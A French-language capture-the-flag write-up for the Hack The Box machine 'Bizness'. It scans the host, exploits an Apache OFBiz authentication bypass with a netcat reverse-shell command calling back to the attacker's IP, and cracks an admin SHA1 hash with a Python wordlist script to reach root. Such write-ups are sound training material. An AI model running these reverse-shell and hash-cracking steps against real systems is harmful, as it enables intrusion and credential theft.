  # Bizness

	echo "10.10.11.252 bizness.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.252 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.252 -oN nmap.txt
	feroxbuster --silent -u https://bizness.htb -k
	
Scans classiques.

    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
    80/tcp  open  http     nginx 1.18.0
    443/tcp open  ssl/http nginx 1.18.0



C'est un simple site web commercial sans vrai contenu. 

Mais le fuzzing a permis de mettre en évidence un chemin intéressant : 

> https://bizness.htb/control (CODE:200|SIZE:34633) 

Sur cette page de login, on peut voir que c'est du Apache OFBiz.

Et Apache OFBiz est vulnérable à une RCE.

Voir : 
- https://www.fortiguard.com/threat-signal-report/5363/apache-ofbiz-authentication-bypass-cve-2023-51467-cve-2023-49070
- https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT 
- https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass 

>
 
    git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
    cd Apache-OFBiz-Authentication-Bypass 
    
    rlwrap nc -nvlp 9999
    python exploit.py --url https://bizness.htb --cmd 'nc 10.10.16.10 9999 -e /bin/bash'
    ...
    python3 -c 'import pty ; pty.spawn("/bin/bash")'
    cd ~
	cat user.txt	 

## Élévation de privilèges


Dans /opt/ofbiz/framework/resources/templates on trouve un fichier **AdminUserLoginData.xml** contenant un hash SHA1 : 

    $SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=

Il manque cependant la partie du salt. J'ai trouvé un script permettant de bruteforcer ce salt : 

    import hashlib
    import base64
    import os
    from tqdm import tqdm

    class PasswordEncryptor:
        def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
            """
            Initialize the PasswordEncryptor object with a hash type and PBKDF2 iterations.

            :param hash_type: The hash algorithm to use (default is SHA).
            :param pbkdf2_iterations: The number of iterations for PBKDF2 (default is 10000).
            """
            self.hash_type = hash_type
            self.pbkdf2_iterations = pbkdf2_iterations

        def crypt_bytes(self, salt, value):
            """
            Crypt a password using the specified hash type and salt.

            :param salt: The salt used in the encryption.
            :param value: The password value to be encrypted.
            :return: The encrypted password string.
            """
            if not salt:
                salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
            hash_obj = hashlib.new(self.hash_type)
            hash_obj.update(salt.encode('utf-8'))
            hash_obj.update(value)
            hashed_bytes = hash_obj.digest()
            result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
            return result

        def get_crypted_bytes(self, salt, value):
            """
            Get the encrypted bytes for a password.

            :param salt: The salt used in the encryption.
            :param value: The password value to get encrypted bytes for.
            :return: The encrypted bytes as a string.
            """
            try:
                hash_obj = hashlib.new(self.hash_type)
                hash_obj.update(salt.encode('utf-8'))
                hash_obj.update(value)
                hashed_bytes = hash_obj.digest()
                return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
            except hashlib.NoSuchAlgorithmException as e:
                raise Exception(f"Error while computing hash of type {self.hash_type}: {e}")

    # Example usage:
    hash_type = "SHA1"
    salt = "d"
    search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
    wordlist = '/usr/wordlist/rockyou.txt'

    # Create an instance of the PasswordEncryptor class
    encryptor = PasswordEncryptor(hash_type)

    # Get the number of lines in the wordlist for the loading bar
    total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

    # Iterate through the wordlist with a loading bar and check for a matching password
    with open(wordlist, 'r', encoding='latin-1') as password_list:
        for password in tqdm(password_list, total=total_lines, desc="Processing"):
            value = password.strip()

            # Get the encrypted password
            hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))

            # Compare with the search hash
            if hashed_password == search:
                print(f'Found Password:{value}, hash:{hashed_password}')
                break  # Stop the loop if a match is found

On trouve le mot de passe de l'administrateur, qui s'avère aussi être le mot de passe root :

    su 
	cat /root/root.txt
